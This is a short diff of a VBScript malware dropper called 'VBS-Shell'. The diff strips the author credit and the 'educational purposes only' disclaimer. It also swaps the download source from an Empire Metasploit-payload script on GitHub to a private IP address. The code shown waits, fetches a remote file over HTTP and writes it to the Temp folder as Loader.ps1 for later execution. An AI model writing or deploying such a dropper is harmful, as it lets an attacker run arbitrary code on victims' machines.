@@ -1,13 +1,7 @@
-''       / Author     : NYAN CAT
-''       / Name       : VBS-Shell
-''       / Contact    : https://github.com/NYAN-x-CAT
-
-''       This program is distributed for educational purposes only.
-
 WScript.Sleep 5000
 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
 dim bStrm: Set bStrm = createobject("Adodb.Stream")
-xHttp.Open "GET", "https://raw.githubusercontent.com/robpot891/Empire/master/data/module_source/code_execution/Invoke-MetasploitPayload.ps1", False
+xHttp.Open "GET", "http://192.168.100.166/lo.txt", False
 xHttp.Send
 scriptShell = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%") + "\Loader.ps1"
 with bStrm
